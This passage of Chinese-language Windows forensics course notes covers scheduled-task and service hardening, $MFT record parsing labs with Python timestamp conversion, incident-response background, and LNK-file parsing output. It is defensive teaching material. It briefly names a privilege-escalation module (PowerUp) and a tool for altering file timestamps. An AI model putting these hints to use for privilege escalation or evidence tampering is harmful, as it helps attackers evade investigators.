框架等工具包包含 PowerUp 模組，可用於探索系統排程任務中的權限弱點，可用於提升權限； 其二是做好OS Configuration的身分認證操作，配置計劃任務的設定以強制任務在經過身份驗證的帳戶的上下文中運行，而不是允許它們作為SYSTEM運行。關聯的登錄項目位於 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl。可透過 GPO 設定此設定：電腦設定 \u0026gt; [策略] \u0026gt; Windows 設定 \u0026gt; 安全性設定 \u0026gt; 本機原則 \u0026gt; 安全性選項： 網域控制站：允許伺服器操作員排程任務，設定為停用； 其三，新增配置「增加排程優先權」選項以僅允許管理員群組調度優先權進程的權限。 這可以透過 GPO 進行設定：電腦設定 \u0026gt; [策略] \u0026gt; Windows 設定 \u0026gt; 安全性設定 \u0026gt; 本機原則 \u0026gt; 使用者權限指派：增加計畫優先權； 其四，限制使用者帳戶的權限並修復權限升級向量，以便只有授權管理員才能在遠端系統上建立排程任務。 針對T1569(sc.exe)的mitigation有三種 在endpoint偵測他的behavior以便做到prevention 確保帳號的權限不允許具有較低權限等級的使用者建立以較高權限等級執行的服務或與之互動 確保具有較低權限等級的使用者無法取代或修改高權限等級的服務二進位。 "},{"id":472,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/","title":"TaiwanHolyHigh - Windows Forensics - $MFT Background","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - $MFT Background # :::spoiler TOC [TOC] ::: :::info 以下引用若無特別說明皆來自於講師的上課簡報 :::\nBackground # $在windows代表系統檔案 $MFT(Master File Table): FAT(File Allocation Table): Fat 檔案系統，簡稱 File Allocation Table，是微軟和 Caldera 開發組為 Windows 電腦開發的檔案系統 雖然它主要是電腦磁區類型，但在過去幾年中它已作為主要檔案系統格式用於各種手機裝置中。此外，由於它是一個 8 位檔案系統，因此簇數會隨著磁碟容量的增加而增加。 FAT12 - 12 位 FAT16 - 16 位 FAT32 - 32 位 我們還應該澄清，FAT 檔案系統從 1977 年開始使用，但 FAT32 是在 1996 年引入的\nBIOS(Basic Input Output System) POST(Power On Self Test) POST自檢測過程大致為：加電－CPU－ROM－BIOS－System Clock－DMA－64KB RAM－IRQ－顯卡等。檢測顯卡以前的過程稱過關鍵部件測試，如果關鍵部件有問題，計算機會處於掛起狀態，習慣上稱為核心故障。另一類故障稱為非關鍵性故障，檢測完顯卡後，計算機將對64KB以上內存、I／O口、軟硬盤驅動器、鍵盤、即插即用設備、CMOS設置等進行檢測，並在屏幕上顯示各種信息和出錯報告。在正常情況下，POST過程進行得非常快，我們幾乎無法感覺到這個過程。 POST自檢測代碼含義是什麼？ 當系統檢測到相應的錯誤時，會以兩種方式進行報告，即在屏幕上顯示出錯信息或以報警聲響次數的方式來指出檢測到的故障。\nMBR(Master Boot Record) MBR 代表主開機記錄。它是一小段代碼，負責在您的電腦上加載作業系統。 MBR 還包含有關硬碟上的分割區及佈局的資訊。如果您曾經安裝過作業系統，您可能會看到詢問您是否要以 MBR 或 GPT 模式安裝它的提示。這是指硬碟上使用的分割區類型。\n主開機記錄在哪裡？ # 主開機記錄代碼儲存在硬碟的第一個扇區（扇區 0）中。需要注意的是，這個扇區不是任何分割區的一部分，如果你刪除一個分區，MBR 代碼仍然存在。 主開機記錄如何工作 # 當電腦啟動後，MBR 開始啟動儲存在唯獨儲存器中的 BIOS 程式。這意味著當您打開電腦時，MBR 代碼首先執行並從硬碟加載作業系統。 主開機記錄工作流程：\n系統啟動自檢——BIOS檢查系統硬體和CMOS設定。 讀取主開機記錄——檢測可開機設備，BIOS將MBR扇區讀入內存。 檢查 MBR 的結束標誌是否為 0000:7C00H 等於 55AAH。當啟動設備滿足要求時，BIOS 將控制權移交給 MBR 啟動作業系統。 電腦開機訊續: Power POST BIOS MBR VBR $MFT \u0026hellip; $MFT Background # What is $MFT?\n常見之 NTFS 系統檔案如下，多以$符號為開頭。 其中$MFT檔案中記錄所有系統中存放之檔案相關屬性值，為 NTFS 分析之重點項目。 $MFT儲存的內容\nTimestamp Standard File: SO=80, LE=32(Creat+Modified+$MFT Modified+Access) Filename: SO=184, LE=32(Creat+Modified+$MFT Modified+Access) Status: SO=22, LE=2 0000: Delete File 0100: File 0200: Delete Folder 0300: Folder $MFT Record(File Identify/Location): SO=44, LE=4 Resident / non-Resident File "},{"id":473,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/","title":"TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File # :::spoiler TOC [TOC] :::\nBackground # $MFT儲存的內容\n==Status== ==$MFT Record==(File Identify/Location) ==Timestamp== Standard Info Filename ==Resident== 特性如下: $SO\\ne 0$: 意思就是resident file的前面一定有其他檔案，而他一定不會是$MFT的開頭 No File Slack: 沒有檔案暫存區，意味著他會住在一個剛剛好的大小的房間中 Physical Size = Logical Size: 這個就和前一個有相關，logical size就是實際住進去房間的檔案大小，而physical size就是飯店給予我們房間的大小，所以$physical_size\\ge logical_size$ 如果resident file因為駭客的攻擊(injection/trojan/backdoor\u0026hellip;)使得檔案大小變大，而失去原本resident file的身分，則該檔案就會被搬出目前的地方，就算之後檔案大小變回來，還是無法再住回原本的地方，這就是攻擊方所遺留的攻擊痕跡 如何判斷?如果檔名後面接的是18 00 00 00 01 00就是resident file，例如： :::spoiler 範例 ::: 或者是看18 00 00 00 10 00的前面第二個byte(就是non-resident flag)，是00代表不是non-resident file，反之就是 :::spoiler flag範例 ::: 檔案大小 18 00 00 00 10 00後面接著的四個bytes就是檔案大小$\\to$換成10禁制就對了，另外如果此檔案是resident file，則檔案大小後面除了固定的18 00 00 00以外，後面還會有該檔案原本的file signature，以此為例就是89 50 4E 47也就是png的magical header :::spoiler flag範例 此範例就是02 02$\\to$514 bytes ::: ==non-Resident File== 如果是non-resident file，檔名的後面一點會接的是80 00 00 00 48 00 00 00，再後面就是non-resident flag 另外，檔案的大小會在flag往後數40個bytes的地方，以底下範例來說就是F6 09 00 00 Lab - Resident File # Lab - Offset 43208704(d) # 先找檔名，後面會跟著18 00 00 00 01 00，前面會有non-resident flag(前面第二個byte)，再後面會跟著檔案大小D0 01，再後面一點會跟著原本這個file的signature\nNon-Resident Flag: 00 File Size: D0 01 = 464 bytes Lab - Offset 43110400(d) # Non-Resident Flag: 00 File Size: FE 01 = 510 bytes Lab - Non-Resident File # Lab - Offset 43462656(d) # Non-Resident Flag: 01 File Size: F6 09 = 2550 bytes Lab - Offset 43485184(d) # Non-Resident Flag: 01 File Size: 42 0E = 3650 bytes Lab - Offset 62343168(d) # Non-Resident Flag: 01 File Size: F7 12 = 4855 bytes 現場考試 # Offset 51472384(d) # Non-Resient File\nStatus: 01 00 $\\to$ file $MFT Record: 5A C4 $\\to$ 0x3116800 Standard Info Create Time = Modify Time = 1997, 12, 8, 8, 0 $MFT Modify Time = Access Time = 2010, 8, 11, 2, 30, 18, 151785 Filename Timestamp: 2010, 8, 11, 2, 30, 18, 151785 Non-Resident Flag: 01 File Size: FD 02 $\\to$ 765 bytes Offset 65898496(d) # Resident File\nStatus: 00 00 $\\to$ file $MFT Record: 62 FB $\\to$ 0x3ed8800 Standard Info Create Time = Access Time = 2011, 2, 1, 2, 6, 16 Modify Time = 2011, 2, 1, 2, 4, 21 $MFT Modify Time = 2011, 2, 9, 2, 21, 46, 662258 Filename Timestamp: 2011, 2, 9, 2, 16, 36, 547024 Non-Resident Flag: 00 File Size: 99 01 $\\to$ 409 bytes Offset 64329728(d) # Non-Resident File(曾經是resident file)\nStatus: 01 00 $\\to$ file $MFT Record: 66 F5 $\\to$ 0x3d59800 Standard Info Create Time = Access Time = 2011, 2, 3, 1, 17, 53, 184265 Modify Time = 2011, 2, 3, 1, 17, 53, 272156 $MFT Modify Time = 2011, 2, 8, 23, 27, 47, 201321 Filename Time: 2011, 2, 3, 1, 17, 53, 184265 Non-Resident Flag: 01 File Size: 21 01 $\\to$ 289 bytes Offset 65873920(d) # Non-Resident File\nStatus: 00 00 $\\to$ deleted file $MFT Record: 4A FB $\\to$ 0x3ed2800 Standard Info Create Time = Access Time = 2011, 2, 1, 2, 7, 42 Modify Time = 2011, 2, 1, 2, 7, 22 $MFT Modify Time = 2011, 2, 9, 2, 21, 46, 701321 Filename Time: 2011, 2, 9, 2, 16, 36, 400539 Non-Resident Flag: 01 File Size: 6E 02 $\\to$ 622 bytes "},{"id":474,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/","title":"TaiwanHolyHigh - Windows Forensics - $MFT 基本實作","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - $MFT 基本實作 # :::spoiler TOC [TOC] ::: :::info 以下引用若無特別說明皆來自於講師的上課簡報 :::\nBackground # $MFT儲存的內容 ==Status==: SO=22, LE=2，也就是目前此檔案的狀態，分為以下四種 0000: Delete File 0100: File 0200: Delete Folder 0300: Folder ==$MFT Record==(File Identify/Location): SO=44, LE=4，也就是此檔案在record在$MFT的位置在哪邊 ==Timestamp== Standard Info: SO=80, LE=32(Creat+Modified+$MFT Modified+Access)，很容易就可以更改，如果要更改，可以參考New Filetime這個工具 Filename: SO=184, LE=32(Creat+Modified+$MFT Modified+Access) 很難被更改(但還是可以更改) ==Resident / non-Resident File== 下一篇詳細說明 :::info 以下三個練習都是Resident File :::\nLab - Offset 43110400(d) # $MFT長度一段就是1024 Bytes，我把結束的位址減掉開頭的位置就知道了，或是可以直接用HxD底下看長度(0x400) \u0026gt;\u0026gt;\u0026gt; 0x291D400-0x291D000 1024 從上圖也可以看到magical word就是FILE0$\\to$46 49 4C 45 30 Overview(從上到下) # Staus: 01 00$\\to$File 04 00 00 00是固定的 $MFT Record: 74 A4先轉換endian然後變十進位，在乘以1024就會是目前此檔案的開頭位址 \u0026gt;\u0026gt;\u0026gt; mft_record = \u0026#39;74 A4\u0026#39; \u0026gt;\u0026gt;\u0026gt; mft_record = int(\u0026#34;\u0026#34;.join(mft_record.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; hex(mft_record * 1024) \u0026#39;0x291d000\u0026#39; 48 00 00 00 18 00 00 00是固定的 Standard Info Timestamp 此部分可以用之前的script換算 :::spoiler Script 過程 \u0026gt;\u0026gt;\u0026gt; import datetime \u0026gt;\u0026gt;\u0026gt; def ad_timestamp(timestamp): ... if timestamp != 0: ... return datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000) ... return np.nan ... \u0026gt;\u0026gt;\u0026gt; create_time = \u0026#39;8D 6C AD E4 B5 BD CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; create_time = int(\u0026#34;\u0026#34;.join(create_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(create_time) datetime.datetime(2011, 1, 27, 0, 5, 23, 349211) \u0026gt;\u0026gt;\u0026gt; modify_time = \u0026#39;00 DE 13 B1 09 92 C9 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; modify_time = int(\u0026#34;\u0026#34;.join(modify_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(modify_time) datetime.datetime(2009, 2, 18, 20, 44, 28) \u0026gt;\u0026gt;\u0026gt; mft_modify = \u0026#39;E7 CE AF E4 B5 BD CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; mft_modify = int(\u0026#34;\u0026#34;.join(mft_modify.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(mft_modify) datetime.datetime(2011, 1, 27, 0, 5, 23, 364836) \u0026gt;\u0026gt;\u0026gt; access_time = \u0026#39;00 DE 13 B1 09 92 C9 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; access_time = int(\u0026#34;\u0026#34;.join(access_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(access_time) datetime.datetime(2009, 2, 18, 20, 44, 28) ::: Create: 2011, 1, 27, 0, 5, 23, 349211 Modify: 2009, 2, 18, 20, 44, 28 $MFT: 2011, 1, 27, 0, 5, 23, 364836 Access: 2009, 2, 18, 20, 44, 28 Filename Timestamp \u0026gt;\u0026gt;\u0026gt; filename = \u0026#39;8D 6C AD E4 B5 BD CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; filename = int(\u0026#34;\u0026#34;.join(filename.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(filename) datetime.datetime(2011, 1, 27, 0, 5, 23, 349211) Filename Timestamp都是2011, 1, 27, 0, 5, 23, 349211，和前面的create time相同 Lab - Offset 43208704(d) # Staus: 01 00$\\to$File $MFT Record: D4 A4 \u0026gt;\u0026gt;\u0026gt; hex(int(\u0026#34;\u0026#34;.join(\u0026#39;d4 a4\u0026#39;.split(\u0026#39; \u0026#39;)[::-1]), 16) * 1024) \u0026#39;0x2935000\u0026#39; Standard Info Timestamp \u0026gt;\u0026gt;\u0026gt; create_time = \u0026#39;E3 8D 30 E5 B5 BD CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; create_time = int(\u0026#34;\u0026#34;.join(create_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(create_time) datetime.datetime(2011, 1, 27, 0, 5, 24, 208586) \u0026gt;\u0026gt;\u0026gt; modify_time = \u0026#39;00 99 75 C2 57 7A C9 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; modify_time = int(\u0026#34;\u0026#34;.join(modify_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(modify_time) datetime.datetime(2009, 1, 19, 17, 2, 50) Create Time = $MFT Modify Time = 2011, 1, 27, 0, 5, 24, 208586 Modify Time = Access Time = 2009, 1, 19, 17, 2, 50 Filename Timestamp Filename Time = Create Time = 2011, 1, 27, 0, 5, 24, 208586 Lab - Offset 53550080(d) # Staus: 01 00$\\to$File\n$MFT Record: 47 CC\n\u0026gt;\u0026gt;\u0026gt; hex(int(\u0026#34;\u0026#34;.join(\u0026#39;47 CC\u0026#39;.split(\u0026#39; \u0026#39;)[::-1]), 16) * 1024) \u0026#39;0x3311c00\u0026#39; Standard Info Timestamp :::spoiler 運算過程\n\u0026gt;\u0026gt;\u0026gt; create_time = \u0026#39;1D 3F 6E F8 B3 C0 CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; create_time = int(\u0026#34;\u0026#34;.join(create_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(create_time) datetime.datetime(2011, 1, 30, 19, 29, 10, 984476) \u0026gt;\u0026gt;\u0026gt; modify_time = \u0026#39;00 6E A6 FC D2 E0 CA 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; modify_time = int(\u0026#34;\u0026#34;.join(modify_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(modify_time) datetime.datetime(2010, 4, 20, 21, 46, 52) \u0026gt;\u0026gt;\u0026gt; mft_modify = \u0026#39;77 A1 70 F8 B3 C0 CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; mft_modify = int(\u0026#34;\u0026#34;.join(mft_modify.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(mft_modify) datetime.datetime(2011, 1, 30, 19, 29, 11, 101) \u0026gt;\u0026gt;\u0026gt; access_time = \u0026#39;1D 3F 6E F8 B3 C0 CB 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; access_time = int(\u0026#34;\u0026#34;.join(access_time.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(access_time) datetime.datetime(2011, 1, 30, 19, 29, 10, 984476) ::: Create Time = Access Time = 2011, 1, 30, 19, 29, 10, 984476 Modify Time = 2010, 4, 20, 21, 46, 52 $MFT Modify Time = 2011, 1, 30, 19, 29, 11, 101\nFilename Timestamp Create Time = $MFT Modify Time = Access Time = 2011, 1, 30, 19, 29, 10, 984476 Modify Time = 2010, 4, 20, 21, 46, 52\n"},{"id":475,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/","title":"TaiwanHolyHigh - Windows Forensics - Background","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - Background # [TOC]\nBackground # ==資安事件的流程== # Prepare 建立Infra 購買ISO(e.g. ISO 27001) SPA(資安健診) Predict Threat Intelligence(威脅情資) Recon(情蒐) Monitor(監控) 搜尋Pattern Identify(識別): 有興趣可以看這一篇論文筆記DeepCase SOC(資安監控中心) IDS: 入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動 IPS: IThelp - Active Defense Audit: AD常常遇到 EDR Code Review Prevent: 防禦攻擊 Firewall(Layer 4 - Transport) WAF(Layer 7 - Application) DLP(資料外洩防護) Incident Profile: 這個項目比較能夠得到一些惡意的行為，而該行為一定脫離不了下面三點 Purpose/Payload(有可能是Data, Source, 或金錢等等) Path(透過甚麼途徑達成目的，有可能是USB, 社交工程, 0-day) Behavior(建立帳戶/開service/與C\u0026amp;C連線等等) Incident Response Restore(主動) Recovery(被動) Isolate Deter: 主動式的阻絕 Inside Outside(就是找外援通常是執法單位) law enforcement(執法單位) Forensics Triage: 做分流的動作 揮發性資料(RAM\u0026hellip;) Network Process System Artifacts(registry/log/temp\u0026hellip;) Duplicate(Image): 製作證據的映像檔$\\to$非揮發性的資料 RAW Image Evidence File Forensics Analysis 已知項目(Known) Keyword Hash Baseline Recovery Signature Sorting Artifact LNK Prefetch SPL Thumbnail Registry(非揮發性) Log Recycle Bin ==網路攻擊鍊(Cyber Kill Chain)== # 詳細資料: TeamT5 - Cyber Kill Chain\n偵查 Reconnaissance 武裝 Weaponization 遞送 Delivery 漏洞利用 Exploitation: 確保遞送的惡意軟體，藉由目標對象的系統漏洞，得以順利開啟，並使攻擊者獲得控制權 安裝 Installation 發令與控制 Command \u0026amp; Control 行動 Actions "},{"id":476,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/","title":"TaiwanHolyHigh - Windows Forensics - LNK Lab","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - LNK Lab # [TOC]\n:::info 以下引用若無特別說明皆來自於講師的上課簡報 :::\nBackground # What is .LNK? LNK 檔為 Windows 系統中，執行程式或開啟檔案後會留存的捷徑檔，該檔案內會有相當多的資訊\nWhere is .LNK? 預設 LNK 檔案會放在使用者目錄下，可透過以下指令檢視：$ dir c:\\Users\\{username}\\*.lnk /b /s :::spoiler 執行結果\n$ dir c:\\Users\\Bernie\\*.lnk /b /s c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group1\\1 - Desktop.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group2\\1 - Run.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group2\\2 - Search.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group2\\3 - Windows Explorer.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group2\\4 - Control Panel.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group2\\5 - Task Manager.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\01a - Windows PowerShell.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\02a - Windows PowerShell.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\03 - Computer Management.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\04 - Disk Management.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\04-1 - NetworkStatus.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\05 - Device Manager.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\06 - SystemAbout.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\07 - Event Viewer.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\08 - PowerAndSleep.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\09 - Mobility Center.lnk c:\\Users\\Bernie\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\10 - AppsAndFeatures.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Chromium.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\File Shredder.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Google Chrome.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Microsoft Edge.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Oracle VM VirtualBox.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Shows Desktop.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Window Switcher.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\AnyDesk.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Discord.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Excel.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\File Explorer.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Firefox.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\LINE (2).lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\PowerPoint.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Sublime Text 3.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Task Manager.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\The Interactive Disassembler (2).lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\The Interactive Disassembler.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Visual Studio Code.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\VMware Workstation Pro.lnk c:\\Users\\Bernie\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Word.lnk c:\\Users\\Bernie\\Desktop\\Test-Dragon.lnk c:\\Users\\Bernie\\Links\\Desktop.lnk c:\\Users\\Bernie\\Links\\Downloads.lnk c:\\Users\\Bernie\\OneDrive\\Personal Vault.lnk ::: Lab # 可以先到這邊下載lnk_parser_cmd.exe\n==利用lnk parser leak info== # $ lnk_parser_cmd.exe Please enter the name of the shortcut file, or a directory you wish to scan: D:\\NTU\\Taiwan Holy High 8-th\\Windows OS Forensics\\LNK Select a report to output: 1 HTML 2 Comma-separated values (CSV) 3 HTML and CSV 0 No report Select: 0 Do you want to output results to the console? (Y/N) y :::danger 切記，輸入要parse的folder中不能有任何中文字，不然會無法正確parse到路徑 ::: :::spoiler 執行結果\n[Filename]: D:\\NTU\\Taiwan Holy High 8-th\\Windows OS Forensics\\LNK\\$RU2R11Q.lnk [Header] Date created: 01/15/2022 (09:05:22.858) [UTC] Last accessed: 01/15/2022 (09:12:41.429) [UTC] Last modified: 01/15/2022 (09:12:41.429) [UTC] File size: 36735600 bytes File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Icon index: 0 ShowWindow value: 1 (SW_SHOWNORMAL / SW_NORMAL) Hot key value: 0x0000 (None) Link flags: 0x0000009b (HasLinkTargetIDList, HasLinkInfo, HasRelativePath, HasWorkingDir, IsUnicode) [Link Target ID List] CLSID: 20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer Drive: C:\\ Last modified: 01/15/2022 (09:13:52.0) [UTC] Folder attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) Short directory name: PROGRA~1 Date created: 03/19/2019 (04:52:44.0) [UTC] Last accessed: 01/15/2022 (09:13:52.0) [UTC] Long directory name: Program Files Last modified: 01/15/2022 (09:13:22.0) [UTC] Folder attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) Short directory name: EnCase21.4 Date created: 01/15/2022 (09:05:20.0) [UTC] Last accessed: 01/15/2022 (09:14:06.0) [UTC] Long directory name: EnCase21.4 File size: 36735600 bytes Last modified: 01/15/2022 (09:12:42.0) [UTC] File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) 8.3 filename: EnCase.exe Date created: 01/15/2022 (09:05:24.0) [UTC] Last accessed: 01/15/2022 (09:12:42.0) [UTC] Long filename: EnCase.exe [Link Info] Location flags: 0x00000001 (VolumeIDAndLocalBasePath) Drive type: 3 (DRIVE_FIXED) Drive serial number: d421-3ddd Volume label (ASCII): Local path (ASCII): C:\\Program Files\\EnCase21.4\\EnCase.exe [String Data] Relative path (UNICODE): ..\\..\\..\\Program Files\\EnCase21.4\\EnCase.exe Working Directory (UNICODE): C:\\Program Files\\EnCase21.4\\ [Known Folder Location] Known folder GUID: 905e63b6-c1bf-494e-b29c-65b732d3d21a = ProgramFiles First child segment offset: 145 bytes [Metadata Property Store] Property set GUID: 46588ae2-4cbc-4338-bbfc-139326986dce ID: 4 Value: 0x001f (VT_LPWSTR) S-1-5-21-4168624370-2151151290-4123834974-1001 Property set GUID: 446d16b1-8dad-4870-a748-402ea43d788c ID: 104 Value: 0x0048 (VT_CLSID) CLSID: be21401b-2494-49a2-983c-593efc9b1259 [Special Folder Location] Special folder identifier: 38 (ProgramFiles) First child segment offset: 145 bytes [Distributed Link Tracker Properties] Version: 0 NetBIOS name: desktop-3f9joqf Droid volume identifier: 8e80a25c-2cb6-462c-ae5a-2db3ddf2b48a Droid file identifier: 937694df-75e1-11ec-90a7-e8f408da009c Birth droid volume identifier: 8e80a25c-2cb6-462c-ae5a-2db3ddf2b48a Birth droid file identifier: 937694df-75e1-11ec-90a7-e8f408da009c MAC address: e8:f4:08:da:00:9c UUID timestamp: 01/15/2022 (09:00:24.375) [UTC] UUID sequence number: 4263 [Filename]: D:\\NTU\\Taiwan Holy High 8-th\\Windows OS Forensics\\LNK\\Cavin Weapons.ppt.LNK [Header] Date created: 02/03/2011 (00:53:00.789) [UTC] Last accessed: 02/03/2011 (00:53:00.789) [UTC] Last modified: 02/03/2011 (00:52:27.152) [UTC] File size: 441856 bytes File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Icon index: 0 ShowWindow value: 1 (SW_SHOWNORMAL / SW_NORMAL) Hot key value: 0x0000 (None) Link flags: 0x00000083 (HasLinkTargetIDList, HasLinkInfo, IsUnicode) [Link Target ID List] CLSID: 20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer Drive: F:\\ File size: 441856 bytes Last modified: 02/03/2011 (00:52:28.0) [UTC] File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) 8.3 filename: CAVINW~2.PPT Date created: 02/03/2011 (00:53:02.0) [UTC] Last accessed: 02/03/2011 (00:53:02.0) [UTC] Long filename: Cavin Weapons.ppt [Link Info] Location flags: 0x00000001 (VolumeIDAndLocalBasePath) Drive type: 3 (DRIVE_FIXED) Drive serial number: da1b-b94d Volume label (ASCII): Secret Local path (ASCII): F:\\Cavin Weapons.ppt [Distributed Link Tracker Properties] Version: 0 NetBIOS name: cavin Droid volume identifier: 02ea32b0-f9e6-4e44-93b3-9f8f897419a5 Droid file identifier: bdbaaf06-2f2a-11e0-a073-000c297f12a0 Birth droid volume identifier: 02ea32b0-f9e6-4e44-93b3-9f8f897419a5 Birth droid file identifier: bdbaaf06-2f2a-11e0-a073-000c297f12a0 MAC address: 00:0c:29:7f:12:a0 UUID timestamp: 02/03/2011 (00:15:43.937) [UTC] UUID sequence number: 8307 [Filename]: D:\\NTU\\Taiwan Holy High 8-th\\Windows OS Forensics\\LNK\\OWAT Proposal - Malone.lnk [Header] Date created: 02/01/2011 (01:42:46.831) [UTC] Last accessed: 02/01/2011 (01:42:49.753) [UTC] Last modified: 02/01/2011 (01:42:49.909) [UTC] File size: 47694 bytes File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Icon index: 0 ShowWindow value: 